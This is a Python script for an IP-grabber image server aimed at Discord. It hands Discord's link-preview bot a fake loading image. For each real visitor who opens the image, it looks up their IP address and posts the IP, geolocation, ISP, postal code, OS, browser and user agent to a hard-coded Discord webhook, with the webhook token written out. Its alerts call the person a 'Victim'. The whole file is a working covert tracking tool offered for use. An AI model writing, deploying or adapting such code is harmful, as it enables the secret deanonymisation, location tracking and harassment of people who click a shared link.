from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib import parse
import requests, base64, httpagentparser

# === SETTINGS ===
webhook = 'https://discord.com/api/webhooks/1400921771162472609/9jkFkHpoNDKdySJCy_K9T62p3xzEdUxYAGfHwTX4WirLE5kBgv7U7QmL37k1WmSPZq6f'
bindata = requests.get('https://i1.sndcdn.com/artworks-OzDwK6RkxuC6Ujy4-1VoVyg-t500x500.jpg').content
buggedimg = True  # If True, use a "loading" image on Discord; else use actual image

# === FAKE IMAGE (Discord loading bug trick) ===
buggedbin = base64.b85decode(
    b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)'
    b'|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!'
    b'~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
)

# === DISCORD MESSAGE FORMATTING ===
def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "Fentanyl",
        "content": "@everyone",
        "embeds": [{
            "title": "Fentanyl strikes again!",
            "color": 16711803,
            "description": "A Victim opened the original Image. You can find their info below.",
            "author": {"name": "Fentanyl"},
            "fields": [
                {
                    "name": "IP Info",
                    "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                    "inline": True
                },
                {
                    "name": "Advanced Info",
                    "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:**\n```yaml\n{useragent}\n```",
                    "inline": False
                }
            ]
        }]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [{
            "title": "Fentanyl Alert!",
            "color": 16711803,
            "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:**\n```yaml\n{uag}\n```",
            "author": {"name": "Fentanyl"},
            "fields": []
        }]
    }

# === HTTP SERVER ===
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

        try:
            data = requests.get(dic['url']).content if 'url' in dic else bindata
        except Exception:
            data = bindata

        useragent = self.headers.get('user-agent', 'No User Agent Found!')
        os, browser = httpagentparser.simple_detect(useragent)
        xff = self.headers.get('x-forwarded-for', '')

        self.send_response(200)
        self.send_header('Content-type', 'image/jpeg')
        self.end_headers()

        if xff.startswith(('35', '34', '104.196')):
            # Likely Discord preview bot
            if 'discord' in useragent.lower():
                self.wfile.write(buggedbin if buggedimg else bindata)
                try:
                    requests.post(webhook, json=prev(xff, useragent))
                except Exception as e:
                    print(f"Webhook preview post error: {e}")
        else:
            self.wfile.write(data)
            try:
                ipinfo = requests.get(f'https://ipinfo.io/{xff}/json').json()
                payload = formatHook(
                    ipinfo.get('ip', 'N/A'),
                    ipinfo.get('city', 'N/A'),
                    ipinfo.get('region', 'N/A'),
                    ipinfo.get('country', 'N/A'),
                    ipinfo.get('loc', 'N/A'),
                    ipinfo.get('org', 'N/A'),
                    ipinfo.get('postal', 'N/A'),
                    useragent, os, browser
                )
                requests.post(webhook, json=payload)
            except Exception as e:
                print(f"Error fetching/sending IP info: {e}")
        return

# === SERVER BOOT ===
if __name__ == '__main__':
    server = ThreadingHTTPServer(('0.0.0.0', 8080), handler)
    print("Server running on http://0.0.0.0:8080/")
    server.serve_forever()
